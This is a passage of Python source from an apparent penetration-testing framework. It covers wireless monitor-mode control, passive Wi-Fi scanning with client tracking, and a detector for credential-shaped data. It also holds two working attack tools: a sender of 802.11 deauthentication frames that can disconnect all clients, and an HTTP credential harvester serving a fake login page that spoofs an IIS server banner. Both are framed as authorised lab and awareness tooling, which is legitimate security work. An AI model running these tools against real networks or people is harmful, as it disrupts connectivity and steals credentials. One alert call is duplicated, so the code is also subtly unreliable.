    WIRELESS_LAYERS_ERROR = "%s: %s" % (type(_wlan_exc).__name__, _wlan_exc)


def wireless_capability_report() -> List[Dict[str, Any]]:
    """Enumerate wireless interfaces and report monitor-mode support."""
    report: List[Dict[str, Any]] = []
    if not shutil.which("iw"):
        note("'iw' not found - install it (apt install iw) for detailed wireless control.")
    iw_dev = InterfaceManager._run(["iw", "dev"]) if shutil.which("iw") else ""
    current: Dict[str, Any] = {}
    for line in iw_dev.splitlines():
        match = re.match(r"^\s*Interface\s+(\S+)", line)
        if match:
            if current:
                report.append(OrderedDict(current))
            current = OrderedDict([("interface", match.group(1)), ("type", "unknown"),
                                   ("channel", ""), ("mac", "")])
            continue
        if current:
            stripped = line.strip()
            if stripped.startswith("type "):
                current["type"] = stripped.split(None, 1)[1]
            elif stripped.startswith("channel "):
                current["channel"] = stripped.split(None, 1)[1]
            elif stripped.startswith("addr "):
                current["mac"] = stripped.split(None, 1)[1]
    if current:
        report.append(OrderedDict(current))
    # Fall back to /sys when iw is unavailable.
    if not report:
        try:
            for name in sorted(os.listdir("/sys/class/net")):
                phy = "/sys/class/net/%s/phy80211" % name
                if os.path.exists(phy):
                    report.append(OrderedDict([
                        ("interface", name), ("type", "wireless (/sys detection)"),
                        ("channel", ""), ("mac", InterfaceManager.hwaddr(name)),
                    ]))
        except OSError:
            report = []
    monitor_support = []
    if shutil.which("iw"):
        phy_dump = InterfaceManager._run(["iw", "phy"])
        if "monitor" in phy_dump:
            monitor_support.append("at least one phy advertises monitor mode")
    regulatory = InterfaceManager._run(["iw", "reg", "get"]) if shutil.which("iw") else ""
    rfkill = InterfaceManager._run(["rfkill", "list"]) if shutil.which("rfkill") else ""
    heading("WIRELESS CAPABILITY REPORT")
    if report:
        out(c("  %-14s %-22s %-10s %s" % ("INTERFACE", "TYPE", "CHANNEL", "MAC"), "bold"))
        for entry in report:
            out("  %-14s %-22s %-10s %s" % (entry["interface"], entry["type"],
                                            entry.get("channel", "") or "-", entry.get("mac", "")))
    else:
        warn("no wireless interfaces detected on this host (expected on servers/VMs).")
    out("")
    kv_table([
        ("Monitor-mode capability", monitor_support[0] if monitor_support else "not advertised / no phy"),
        ("Scapy 802.11 layers", "available" if WIRELESS_LAYERS_AVAILABLE
         else "unavailable (%s)" % WIRELESS_LAYERS_ERROR),
        ("Regulatory domain", (regulatory.splitlines()[0].strip() if regulatory else "unknown")),
        ("rfkill", ("present" if rfkill.strip() else "not installed")),
    ])
    return report


def monitor_mode_set(iface: str, enable: bool) -> Tuple[bool, str]:
    """
    Flip an interface between managed and monitor mode with verification.

    Uses the modern `iw`/`ip` toolchain only; the caller is responsible for
    reverting, and the module does so in a finally block so a crashed scan can
    never leave the radio in monitor mode.
    """
    if not shutil.which("iw"):
        return False, "the 'iw' utility is required to change interface modes"
    target_type = "monitor" if enable else "managed"
    steps = [
        ["ip", "link", "set", iface, "down"],
        ["iw", "dev", iface, "set", "type", target_type],
        ["ip", "link", "set", iface, "up"],
    ]
    for step in steps:
        proc = subprocess.run(step, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                              timeout=15, check=False, text=True)
        if proc.returncode != 0:
            return False, "command failed: %s (%s)" % (" ".join(step), (proc.stdout or "").strip()[:120])
    info = InterfaceManager._run(["iw", "dev", iface, "info"])
    match = re.search(r"type (\S+)", info)
    actual = match.group(1) if match else "unknown"
    ok_flag = (actual == target_type)
    return ok_flag, "interface type is now '%s'" % actual


def wlan_scan(iface: str, duration: float = 20.0, capture_clients: bool = True) -> Dict[str, Any]:
    """Passive 802.11 scan: beacons, probe responses, and client inventory."""
    if not require_scapy("Wireless scan"):
        raise FrameworkError("scapy unavailable")
    if not WIRELESS_LAYERS_AVAILABLE:
        raise FrameworkError("scapy 802.11 layers unavailable: %s" % WIRELESS_LAYERS_ERROR)
    networks: Dict[str, Dict[str, Any]] = {}
    clients: Dict[str, Dict[str, Any]] = {}
    lock = threading.Lock()
    note("passive scan on %s for %s (interface must be in monitor mode)" % (iface, format_duration(duration)))

    def _observe(packet: Any) -> None:
        try:
            if not packet.haslayer(Dot11):
                return
            dot11 = packet[Dot11]
            subtype = int(dot11.subtype)
            signal = None
            try:
                if packet.haslayer(RadioTap):
                    signal = int(getattr(packet[RadioTap], "dBm_AntSignal", 0) or 0)
            except (AttributeError, TypeError):
                signal = None
            if subtype in (8, 5):                       # beacon / probe response
                bssid = str(dot11.addr3 or "").lower()
                if not bssid:
                    return
                ssid = ""
                channel = ""
                privacy = False
                rsn = False
                element = packet.getlayer(Dot11Elt)
                while element is not None:
                    try:
                        element_id = int(element.ID)
                    except (AttributeError, TypeError, ValueError):
                        break
                    if element_id == 0:
                        try:
                            ssid = bytes(element.info).decode("utf-8", "replace")
                        except (AttributeError, TypeError, UnicodeDecodeError):
                            ssid = ""
                    elif element_id == 3 and element.info:
                        try:
                            channel = str(int(element.info[0]))
                        except (IndexError, TypeError, ValueError):
                            channel = ""
                    elif element_id == 48:
                        rsn = True
                    element = element.payload if isinstance(element.payload, Dot11Elt) else None
                try:
                    privacy = bool(int(getattr(dot11, "cap", 0)) & 0x0010) or bool(
                        getattr(packet[Dot11Beacon], "cap", 0) & 0x0010)
                except (AttributeError, KeyError, TypeError, ValueError):
                    privacy = bool(rsn)
                with lock:
                    entry = networks.setdefault(bssid, OrderedDict([
                        ("bssid", bssid), ("ssid", ssid or "<hidden>"), ("channel", channel),
                        ("encryption", "WPA2/3 (RSN)" if rsn else ("WEP/legacy" if privacy else "OPEN")),
                        ("signal_dbm", signal), ("beacons", 0), ("first_seen", format_timestamp()),
                    ]))
                    entry["beacons"] += 1
                    if ssid and entry["ssid"] == "<hidden>":
                        entry["ssid"] = ssid
                    if signal is not None and (entry["signal_dbm"] is None or signal > entry["signal_dbm"]):
                        entry["signal_dbm"] = signal
                if len(networks) <= 15:
                    out("  %s %-18s ch=%-4s %-14s %s" % (
                        c("AP", "bgreen", "bold"), bssid, channel or "?",
                        entry["encryption"], ssid or "<hidden>"))
                if alerts_armed():
                    alert_wireless_ap(bssid, ssid or "<hidden>", channel, entry["encryption"])
            if capture_clients and subtype == 4:        # probe request
                client_mac = str(dot11.addr2 or "").lower()
                if not client_mac or client_mac == "ff:ff:ff:ff:ff:ff":
                    return
                probed = ""
                element = packet.getlayer(Dot11Elt)
                while element is not None:
                    try:
                        if int(element.ID) == 0 and element.info:
                            probed = bytes(element.info).decode("utf-8", "replace")
                            break
                    except (AttributeError, TypeError, ValueError):
                        break
                    element = element.payload if isinstance(element.payload, Dot11Elt) else None
                with lock:
                    client = clients.setdefault(client_mac, OrderedDict([
                        ("mac", client_mac), ("first_seen", format_timestamp()),
                        ("probed_ssids", []), ("packets", 0), ("signal_dbm", signal),
                    ]))
                    client["packets"] += 1
                    if probed and probed not in client["probed_ssids"]:
                        client["probed_ssids"].append(probed)
        except (AttributeError, IndexError, KeyError, TypeError, ValueError):
            return

    kwargs: Dict[str, Any] = {"prn": _observe, "store": False, "iface": iface,
                              "timeout": max(2.0, duration)}
    try:
        sniff(**kwargs)
    except KeyboardInterrupt:
        warn("wireless scan interrupted by operator.")
    except OSError as exc:
        raise FrameworkError("wireless capture failed: %s (is %s in monitor mode?)" % (exc, iface))
    heading("WIRELESS SCAN RESULTS")
    kv_table([
        ("Interface", iface),
        ("Access points", len(networks)),
        ("Clients observed", len(clients) if capture_clients else "not tracked"),
        ("Duration", format_duration(duration)),
    ])
    if networks:
        out("")
        out(c("  %-18s %-26s %-4s %-14s %-8s %s" % ("BSSID", "SSID", "CH", "ENCRYPTION",
                                                    "SIGNAL", "BEACONS"), "bold"))
        for entry in sorted(networks.values(), key=lambda item: -(item["signal_dbm"] or -999)):
            out("  %-18s %-26s %-4s %-14s %-8s %s" % (
                entry["bssid"], entry["ssid"][:26], entry["channel"] or "?",
                entry["encryption"], ("%s dBm" % entry["signal_dbm"])
                if entry["signal_dbm"] is not None else "-", entry["beacons"]))
        open_networks = [entry for entry in networks.values() if entry["encryption"] == "OPEN"]
        if open_networks:
            warn("%d open (unencrypted) network(s) observed: %s"
                 % (len(open_networks), ", ".join(entry["ssid"] for entry in open_networks[:6])))
        wep_networks = [entry for entry in networks.values() if entry["encryption"] == "WEP/legacy"]
        if wep_networks:
            warn("%d legacy-encryption network(s) observed - WEP is trivially broken." % len(wep_networks))
    else:
        warn("no beacons captured - confirm the interface is in monitor mode and on-channel.")
    if capture_clients and clients:
        out("")
        out(c("  client inventory (probe requests)", "cyan"))
        for client in list(clients.values())[:25]:
            out("    %-18s packets=%-5s probed: %s" % (
                client["mac"], client["packets"],
                ", ".join(client["probed_ssids"][:4]) or c("(wildcard/broadcast)", "grey")))
    summary = OrderedDict([
        ("mode", "wlan-scan"),
        ("interface", iface),
        ("duration_seconds", duration),
        ("networks", list(networks.values())),
        ("clients", list(clients.values())[:200]),
    ])
    artifact = LOGGER.scan("wlan_scan", summary, target=iface)
    if artifact:
        note("artefact: %s" % artifact)
    return summary


def deauth_lab(iface: str, bssid: str, client: str = "ff:ff:ff:ff:ff:ff", count: int = 10,
               reason: int = 7, interval: float = 0.1) -> Dict[str, Any]:
    """
    Authorised 802.11 deauthentication lab: emits Dot11Deauth frames to test
    client reconnection behaviour and WIDS detection on your own APs only.
    """
    if not require_scapy("Deauthentication lab"):
        raise FrameworkError("scapy unavailable")
    if not WIRELESS_LAYERS_AVAILABLE:
        raise FrameworkError("scapy 802.11 layers unavailable: %s" % WIRELESS_LAYERS_ERROR)
    try:
        bssid_clean = parse_mac(bssid)
        client_clean = parse_mac(client) if client and client != "ff:ff:ff:ff:ff:ff" else "ff:ff:ff:ff:ff:ff"
    except FrameworkError as exc:
        raise FrameworkError(str(exc))
    count = int(count)
    if not (1 <= count <= 200):
        raise FrameworkError("frame count must be between 1 and 200")
    if not (1 <= int(reason) <= 45):
        raise FrameworkError("802.11 reason code must be 1-45 (7 = class-3 frame from nonassociated station)")
    heading("DEAUTHENTICATION LAB")
    kv_table([
        ("Interface", iface),
        ("Access point (BSSID)", bssid_clean),
        ("Target client", client_clean if client_clean != "ff:ff:ff:ff:ff:ff" else "broadcast (all clients)"),
        ("Frames", count),
        ("Reason code", reason),
        ("Spacing", "%.3fs" % interval),
    ])
    warn("deauthentication disconnects real clients - test only against infrastructure you own.")
    if not prompt_yes_no("Confirm authorisation and transmit the frames", False):
        warn("deauthentication lab cancelled.")
        return OrderedDict([("aborted", True)])
    frame = (RadioTap()
             / Dot11(type=0, subtype=12, addr1=client_clean, addr2=bssid_clean, addr3=bssid_clean)
             / Dot11Deauth(reason=int(reason)))
    transmitted = 0
    errors = 0
    for index in range(count):
        try:
            sendp(frame, iface=iface, verbose=0)
            transmitted += 1
            out("  %s frame %d/%d  %s" % (c("SENT", "byellow", "bold"), index + 1, count,
                                          frame.summary()))
        except (OSError, PermissionError) as exc:
            errors += 1
            LOGGER.event("warn", "deauth transmit error: %s" % exc, level="WARN")
        time.sleep(max(0.0, interval))
    heading("DEAUTH LAB SUMMARY")
    kv_table([("Frames transmitted", transmitted), ("Errors", errors), ("Reason", reason)])
    note("recovery: affected clients reconnect automatically; if a test client stays down, "
         "toggle its interface or wait for the reassociation timer.")
    summary = OrderedDict([
        ("mode", "deauth-lab"),
        ("interface", iface), ("bssid", bssid_clean), ("client", client_clean),
        ("frames", transmitted), ("errors", errors), ("reason", reason),
        ("frame_summary", str(frame.summary())),
    ])
    artifact = LOGGER.scan("deauth_lab", summary, target=bssid_clean)
    if artifact:
        note("artefact: %s" % artifact)
    return summary


@root_required
@module_guard("Wireless Lab")
def module_wireless(args: Optional[List[str]] = None) -> None:
    """Interactive 802.11 suite with automatic monitor-mode revert."""
    while True:
        heading("MODULE 16 - WIRELESS LAB")
        options = OrderedDict([
            ("1", "Wireless capability report (interfaces, monitor support, regulatory)"),
            ("2", "Passive scan in monitor mode (monitor mode applied and reverted)"),
            ("3", "Scan on an already-monitor interface"),
            ("4", "Deauthentication lab (owned APs only)"),
            ("5", "Monitor-mode command reference"),
            ("6", "ONLINE: wireless intelligence (AP vendor lookup, scan push)"),
            ("0", "Return to main menu"),
        ])
        for key, label in options.items():
            out("  [%s] %s" % (c(key, "byellow", "bold"), label))
        choice = prompt_text("wlan> select")
        if choice is PROMPT_ABORT:
            return
        choice = str(choice).strip()

        if choice == "6":
            online_wireless_console()
            continue
        if choice == "0":
            return
        if choice == "1":
            wireless_capability_report()
        elif choice == "2":
            interfaces = wireless_capability_report()
            if not interfaces:
                warn("no wireless interface available - aborting.")
                continue
            names = [entry["interface"] for entry in interfaces]
            name_raw = prompt_text("wireless interface (%s)" % "/".join(names), default=names[0])
            if name_raw is PROMPT_ABORT:
                continue
            iface = str(name_raw).strip()
            duration = prompt_float("scan duration seconds", 3.0, 600.0, 20.0)
            if duration is PROMPT_ABORT:
                continue
            enabled, detail = monitor_mode_set(iface, True)
            if not enabled:
                err("could not enable monitor mode: %s" % detail)
                note("if another process (NetworkManager/wpa_supplicant) holds the interface, "
                     "stop it first: sudo systemctl stop NetworkManager wpa_supplicant")
                continue
            ok("monitor mode enabled (%s)" % detail)
            try:
                wlan_scan(iface, duration=float(duration))
            finally:
                reverted, revert_detail = monitor_mode_set(iface, False)
                if reverted:
                    ok("monitor mode reverted - interface returned to managed mode.")
                else:
                    err("AUTOMATIC REVERT FAILED (%s) - run: sudo ip link set %s down && "
                        "sudo iw dev %s set type managed && sudo ip link set %s up"
                        % (revert_detail, iface, iface, iface))
                LOGGER.event("wireless", "monitor mode reverted",
                             data={"iface": iface, "success": reverted, "detail": revert_detail})
        elif choice == "3":
            iface_raw = prompt_text("monitor-mode interface name")
            if iface_raw is PROMPT_ABORT:
                continue
            duration = prompt_float("scan duration seconds", 3.0, 600.0, 20.0)
            if duration is PROMPT_ABORT:
                continue
            wlan_scan(str(iface_raw).strip(), duration=float(duration))
        elif choice == "4":
            iface_raw = prompt_text("monitor-mode interface name")
            if iface_raw is PROMPT_ABORT:
                continue
            bssid_raw = prompt_text("access point BSSID")
            if bssid_raw is PROMPT_ABORT:
                continue
            client_raw = prompt_text("client MAC (blank = broadcast to all clients)",
                                     default="", allow_blank=True)
            if client_raw is PROMPT_ABORT:
                continue
            count = prompt_int("frame count", 1, 200, 10)
            if count is PROMPT_ABORT:
                continue
            reason = prompt_int("802.11 reason code", 1, 45, 7)
            if reason is PROMPT_ABORT:
                continue
            spacing = prompt_float("spacing seconds", 0.0, 5.0, 0.1)
            if spacing is PROMPT_ABORT:
                continue
            try:
                deauth_lab(str(iface_raw).strip(), str(bssid_raw).strip(),
                           str(client_raw).strip() or "ff:ff:ff:ff:ff:ff",
                           int(count), int(reason), float(spacing))
            except FrameworkError as exc:
                err(str(exc))
        elif choice == "5":
            heading("MONITOR-MODE COMMAND REFERENCE")
            steps = [
                ("1", "sudo systemctl stop NetworkManager wpa_supplicant   # release the radio"),
                ("2", "sudo ip link set wlan0 down"),
                ("3", "sudo iw dev wlan0 set type monitor"),
                ("4", "sudo ip link set wlan0 up"),
                ("5", "sudo iw dev wlan0 set channel 6                  # lock to a channel"),
                ("6", "verify: iw dev wlan0 info  ->  type monitor"),
                ("7", "revert: sudo ip link set wlan0 down && iw dev wlan0 set type managed && ip link set wlan0 up"),
            ]
            for step, command in steps:
                out("  %s %s" % (c(step, "byellow"), c(command, "green")))
            out("")
            out(c("  USB adapters with known monitor support: Alfa AWUS036 series, TP-Link TL-WN722N v1,",
                  "grey"))
            out(c("  Panda PAU09. Built-in Intel cards generally cannot inject.", "grey"))
        else:
            warn("unrecognised selection '%s'." % choice)


# ===========================================================================
# MODULE 17 - AWARENESS LISTENERS (HTTP harvester + protocol credential traps)
# ===========================================================================
CRED_PATTERNS: List[Tuple[str, str]] = [
    ("form/url password", r"(?i)(?:password|passwd|pwd|pass)\s*[=:]\s*([^\s&;,\"']{1,120})"),
    ("form/url username", r"(?i)(?:username|user|login|uname|email)\s*[=:]\s*([^\s&;,\"']{1,120})"),
    ("http basic auth", r"(?i)authorization:\s*basic\s+([A-Za-z0-9+/=]{4,})"),
    ("bearer token", r"(?i)authorization:\s*bearer\s+([A-Za-z0-9._\-]{8,})"),
    ("cookie session", r"(?i)cookie:\s*([^\r\n]{8,200})"),
    ("ftp USER command", r"(?m)^USER\s+(\S{1,64})"),
    ("ftp PASS command", r"(?m)^PASS\s+(\S{1,64})"),
    ("pop3/imap login", r"(?im)^(?:USER|LOGIN|A\d+\s+LOGIN)\s+(\S{1,64})(?:\s+(\S{1,64}))?"),
    ("smtp auth plain", r"(?i)AUTH\s+PLAIN\s+([A-Za-z0-9+/=]{4,})"),
    ("generic login prompt", r"(?im)^(?:login|user(?:name)?)\s*:\s*(\S{1,64})"),
    ("sql connection string", r"(?i)(?:uid|user id)=([^;\s]{1,64}).{0,40}?(?:pwd|password)=([^;\s]{1,64})"),
    ("aws access key", r"\b(AKIA[0-9A-Z]{16})\b"),
    ("private key header", r"(-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----)"),
]


def mask_secret(value: str, keep: int = 1) -> str:
    """Mask a secret for logs, retaining a length hint for evidence value."""
    text = str(value)
    if len(text) <= keep:
        return "*" * len(text)
    return text[:keep] + "*" * (len(text) - keep)


def _decode_basic_auth_token(token: str) -> Optional[str]:
    'Decode an HTTP basic-auth token; returns None when it is not decodable.'
    # Padding is normalised with the exact modulo instead of a blind triple equals, and
    # a data length that cannot occur in base64 (one more than a multiple of four) is
    # refused outright. The URL-safe alphabet is translated before decoding, because the
    # lenient decoder would otherwise discard '-' and '_' and hand back wrong bytes, and
    # a token outside both alphabets is refused rather than decoded into garbage.
    if not isinstance(token, str):
        return None
    candidate = token.strip()
    quote_chars = chr(34) + chr(39)
    if len(candidate) >= 2 and candidate[0] == candidate[-1] and candidate[0] in quote_chars:
        candidate = candidate[1:-1].strip()
    if not candidate:
        return None
    standard_alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    url_safe_alphabet = standard_alphabet + chr(45) + chr(95)
    url_safe = ("-" in candidate) or ("_" in candidate)
    alphabet = url_safe_alphabet if url_safe else standard_alphabet
    body = candidate.rstrip("=")
    if not body or len(body) % 4 == 1:
        return None
    for character in body:
        if character not in alphabet:
            return None
    if url_safe:
        candidate = candidate.replace("-", "+").replace("_", "/")
        body = candidate.rstrip("=")
    padded = body + "=" * ((4 - len(body) % 4) % 4)
    try:
        import base64 as _b64
        return _b64.b64decode(padded).decode("utf-8", "replace")
    except (ValueError, TypeError):
        return None


def scan_for_credentials(payload: bytes, redact: bool = True,
                         max_findings: int = 20) -> List[Dict[str, Any]]:
    """
    Detect credential-shaped material in a byte payload.

    Returns structured findings with a redacted preview by default; set
    redact=False only when the engagement's rules of evidence require the raw
    value (the caller is responsible for handling it accordingly).
    """
    findings: List[Dict[str, Any]] = []
    if not payload:
        return findings
    try:
        text = payload.decode("utf-8", "replace")
    except (UnicodeDecodeError, AttributeError, TypeError):
        return findings
    for kind, pattern in CRED_PATTERNS:
        try:
            for match in re.finditer(pattern, text):
                groups = [str(group) for group in match.groups() if group]
                if not groups:
                    continue
                preview = " | ".join(groups)
                entry = OrderedDict([
                    ("kind", kind),
                    ("offset", match.start()),
                    ("preview", mask_secret(preview) if redact else preview),
                    ("length", len(preview)),
                ])
                if kind == "http basic auth" and groups:
                    decoded = _decode_basic_auth_token(groups[0])
                    if decoded is not None:
                        entry["decoded"] = mask_secret(decoded) if redact else decoded
                findings.append(entry)
                if len(findings) >= max_findings:
                    return findings
        except re.error:
            continue
    return findings


def _harvester_page(title: str, action: str, username_field: str, password_field: str,
                    subtitle: str) -> bytes:
    """Self-contained login page (inline CSS, no external assets)."""
    return ("""<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>%(title)s</title>
<style>
 body{font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:#0f172a;
      color:#e2e8f0;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
 .card{background:#1e293b;padding:2.4rem 2rem;border-radius:12px;width:340px;
       box-shadow:0 20px 40px rgba(0,0,0,.45);border:1px solid #334155}
 h1{font-size:1.15rem;margin:0 0 .3rem}
 p.sub{margin:0 0 1.4rem;color:#94a3b8;font-size:.82rem}
 label{display:block;font-size:.78rem;margin:.8rem 0 .3rem;color:#cbd5e1}
 input{width:100%%;padding:.6rem .7rem;border-radius:8px;border:1px solid #475569;
       background:#0f172a;color:#e2e8f0;font-size:.9rem}
 button{width:100%%;margin-top:1.4rem;padding:.7rem;border:0;border-radius:8px;
        background:#2563eb;color:#fff;font-weight:600;font-size:.9rem;cursor:pointer}
 button:hover{background:#1d4ed8}
 .foot{margin-top:1.1rem;font-size:.7rem;color:#64748b;text-align:center}
</style></head><body>
<form class="card" method="POST" action="%(action)s">
 <h1>%(title)s</h1><p class="sub">%(subtitle)s</p>
 <label for="u">Username</label>
 <input id="u" name="%(username)s" autocomplete="username" autofocus>
 <label for="p">Password</label>
 <input id="p" type="password" name="%(password)s" autocomplete="current-password">
 <button type="submit">Sign in</button>
 <div class="foot">Authorised security-awareness simulation</div>
</form></body></html>""" % {
        "title": title, "action": action, "username": username_field,
        "password": password_field, "subtitle": subtitle}).encode("utf-8")


def _arm_read_deadline(connection: Any, seconds: float,
                       expire: Callable[[], None]) -> Optional[threading.Timer]:
    'Arm an absolute read deadline for one listener connection.'
    # The socket timeout only bounds silence: a client that dribbles a byte just inside
    # the deadline keeps resetting it, and would hold the handler thread plus one of the
    # bounded connection slots forever. This watchdog shuts the read side down at the
    # wall-clock deadline, which wakes a blocked read with EOF; both listeners treat
    # that as a normal client disconnect. The callback re-checks the socket, so a
    # watchdog that fires just after the conversation ended stays silent.
    if not seconds or float(seconds) <= 0:
        return None
    timer = threading.Timer(float(seconds), expire)
    timer.daemon = True
    timer.start()
    return timer


def _build_awareness_server(bind_address: str, port: int, title: str, username_field: str,
                            password_field: str, capture_passwords: bool,
                            redirect_url: str, client_timeout: float = 10.0,
                            max_connections: int = 64,
                            connection_budget: float = 300.0) -> Tuple[Any, List[Dict[str, Any]]]:
    """
    Build the awareness-harvester HTTP server: handler plus a bounded thread pool.

    Hoisted out of the interactive wrapper so the self-test can drive the real
    object. Two hardening rules live here:
      * every connection carries a read/write deadline, so a silent or slow client
        (a Slowloris profile) cannot pin a worker thread indefinitely;
      * the number of concurrently served connections is capped by a semaphore, so a
        connection flood is refused instead of spawning unbounded threads;
      * each conversation also carries an absolute read deadline, so a slow-drip client
        that satisfies every socket timeout cannot hold a slot forever.
    """

    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
    from urllib.parse import parse_qs
    captures: List[Dict[str, Any]] = []
    capture_lock = threading.RLock()
    page_bytes = _harvester_page(title, "/", username_field, password_field,
                                 "Sign in to continue to your workspace")
    acknowledgement = (b"<!DOCTYPE html><html><head><meta charset='utf-8'>"
                       b"<title>Simulation complete</title></head><body "
                       b"style='font-family:system-ui;background:#0f172a;color:#e2e8f0;"
                       b"display:flex;align-items:center;justify-content:center;height:100vh'>"
                       b"<div style='text-align:center;max-width:520px'><h1>This was a "
                       b"security-awareness simulation</h1><p>No credentials were stored by any "
                       b"third party. If you entered a real password here, change it now and report "
                       b"this page to your security team.</p></div></body></html>")

    class HarvesterHandler(BaseHTTPRequestHandler):
        server_version = "Microsoft-IIS/10.0"
        protocol_version = "HTTP/1.1"
        # StreamRequestHandler.setup() applies this to the connection socket, so a
        # slow or silent client is dropped instead of blocking a worker thread.
        timeout = max(1.0, float(client_timeout))
        # The read deadline only bounds silence, so this is the wall-clock cap for the
        # whole conversation, keep-alive requests included.
        budget_seconds = max(0.0, float(connection_budget))

        def handle(self) -> None:
            # Mirrors BaseHTTPRequestHandler.handle(), which simply loops on
            # handle_one_request() until close_connection is set, and adds two guards:
            # the socket deadline is shortened towards the budget, and the watchdog shuts
            # the read side down at the budget itself, so a dribbling client cannot hold
            # a worker thread.
            deadline = (time.time() + self.budget_seconds) if self.budget_seconds > 0 else 0.0
            self.budget_watchdog = _arm_read_deadline(self.connection, self.budget_seconds,
                                                      self._deadline_reached)
            self.close_connection = True
            self.handle_one_request()
            while not self.close_connection:
                if deadline:
                    remaining = deadline - time.time()
                    if remaining <= 0:
                        break
                    try:
                        self.connection.settimeout(max(0.05, min(float(self.timeout), remaining)))
                    except OSError:
                        break
                self.handle_one_request()

        def finish(self) -> None:
            watchdog = getattr(self, "budget_watchdog", None)
            if watchdog is not None:
                watchdog.cancel()
            super().finish()

        def _deadline_reached(self) -> None:
            connection = getattr(self, "connection", None)
            if connection is None or connection.fileno() < 0:
                return
            peer = self.client_address[0] if self.client_address else "?"
            LOGGER.event("listener",
                         "harvester connection deadline (%.0fs) reached - closing %s"
                         % (self.budget_seconds, peer), level="WARN")
            try:
                connection.shutdown(socket.SHUT_RD)
            except OSError:
                pass

        def log_message(self, fmt, *args):  # noqa: A003 - stdlib signature
            LOGGER.event("listener", "HTTP %s" % (fmt % args))

        def log_error(self, fmt, *args):  # noqa: N802 - stdlib signature
            message = (fmt % args) if args else str(fmt)
            if "timed out" in message.lower():
                LOGGER.event("listener", "harvester client deadline reached after %ss: %s"
                             % (self.timeout, message), level="WARN")
            else:
                LOGGER.event("listener", "harvester client error: %s" % message)

        def _send(self, status: int, body: bytes, content_type: str = "text/html; charset=utf-8",
                  extra_headers: Optional[List[Tuple[str, str]]] = None) -> None:
            try:
                self.send_response(status)
                self.send_header("Content-Type", content_type)
                self.send_header("Content-Length", str(len(body)))
                self.send_header("Cache-Control", "no-store")
                for key, value in (extra_headers or []):
                    self.send_header(key, value)
                self.end_headers()
                if self.command != "HEAD":
                    self.wfile.write(body)
            except (BrokenPipeError, ConnectionResetError, OSError):
                return

        def do_GET(self):  # noqa: N802 - stdlib signature
            if self.path.startswith(("/favicon.ico", "/robots.txt")):
                self._send(404, b"not found", "text/plain")
                return
            self._send(200, page_bytes)

        def do_HEAD(self):  # noqa: N802
            self._send(200, b"")

        def do_POST(self):  # noqa: N802
            try:
                length = int(self.headers.get("Content-Length") or 0)
            except (TypeError, ValueError):
                length = 0
            body = b""
            if length:
                try:
                    body = self.rfile.read(min(length, 1024 * 256))
                except (OSError, ValueError):
                    body = b""
            fields: Dict[str, str] = {}
            try:
                parsed = parse_qs(body.decode("utf-8", "replace"), keep_blank_values=True)
                for key, values in parsed.items():
                    fields[str(key)] = str(values[0]) if values else ""
            except (UnicodeDecodeError, ValueError, TypeError):
                fields = {"raw": body[:200].decode("utf-8", "replace")}
            username = fields.get(username_field, "")
            password = fields.get(password_field, "")
            record = OrderedDict([
                ("timestamp", format_timestamp()),
                ("client", self.client_address[0] if self.client_address else "?"),
                ("user_agent", self.headers.get("User-Agent", "")[:160]),
                ("path", self.path[:120]),
                ("referer", self.headers.get("Referer", "")[:120]),
                ("username", username or "(empty)"),
                ("password", password if capture_passwords else mask_secret(password)),
                ("password_captured_in_full", bool(capture_passwords)),
                ("other_fields", {key: value for key, value in fields.items()
                                  if key not in (username_field, password_field)}),
            ])
            with capture_lock:
                captures.append(record)
            LOGGER.event("listener", "credential submission captured from %s (user=%s)"
                         % (record["client"], record["username"]))
            out("")
            out("  %s submission #%d from %-15s user=%-18s password=%s" % (
                c("CAPTURED", "bgreen", "bold"), len(captures), record["client"],
                record["username"][:18], record["password"]))
            if alerts_armed():
                alert_credential(record["client"], "http-harvest", record["username"],
                                 "(secret withheld from the relay)")
            if alerts_armed():
                alert_credential(record["client"], "http-harvest", record["username"],
                                 "(secret withheld from the relay)")
            if redirect_url:
                self._send(302, b"", "text/html", [("Location", redirect_url)])
            else:
                self._send(200, acknowledgement)

    class BoundedHarvesterServer(ThreadingHTTPServer):
        """Threaded HTTP server with a hard cap on concurrently served connections."""
        daemon_threads = True
        allow_reuse_address = True
        request_queue_size = 64

        def __init__(self, address: Any, handler: Any, cap: int = 64,
                     budget: float = 300.0) -> None:
            self.max_connections = max(1, int(cap))
            self.connection_budget = max(0.0, float(budget))
            self.refused_connections = 0
            super().__init__(address, handler)
            self._slots = threading.BoundedSemaphore(self.max_connections)

        def process_request(self, request: Any, client_address: Any) -> None:
            if not self._slots.acquire(blocking=False):
                self.refused_connections += 1
                LOGGER.event("listener", "harvester connection cap (%d) reached - refused %s"
                             % (self.max_connections, client_address[0]), level="WARN")
                try:
                    request.close()
                except OSError:
                    pass
                return
            try:
                super().process_request(request, client_address)
            except BaseException:
                self._slots.release()
                raise

        def process_request_thread(self, request: Any, client_address: Any) -> None:
            try:
                super().process_request_thread(request, client_address)
            finally:
                self._slots.release()

    try:
        server = BoundedHarvesterServer((bind_address, int(port)), HarvesterHandler,
                                        cap=max_connections, budget=connection_budget)
    except OSError as exc:
        raise FrameworkError("could not bind %s:%s - %s" % (bind_address, port, exc))
    return server, captures


def http_harvester(bind_address: str = "0.0.0.0", port: int = 8080, title: str = "Staff Portal",
                   username_field: str = "username", password_field: str = "password",
                   duration: float = 300.0, capture_passwords: bool = False,
                   redirect_url: str = "", client_timeout: float = 10.0,
                   max_connections: int = 64,
                   connection_budget: float = 300.0) -> Dict[str, Any]:
    """
    Single-page HTTP credential-harvesting listener for security-awareness
    exercises. Serves an inline login page, records submissions (masked unless
    explicitly enabled), and always answers with a training notice afterwards.
    """
    server, captures = _build_awareness_server(
        bind_address, port, title, username_field, password_field, capture_passwords,
        redirect_url, client_timeout=client_timeout, max_connections=max_connections,
        connection_budget=connection_budget)
    thread: Optional[threading.Thread] = None
    actual_port = int(server.server_address[1])
    heading("HTTP AWARENESS HARVESTER")
    kv_table([
        ("Listening on", "%s:%d" % (bind_address, actual_port)),
        ("Page title", title),
        ("Form fields", "%s / %s" % (username_field, password_field)),
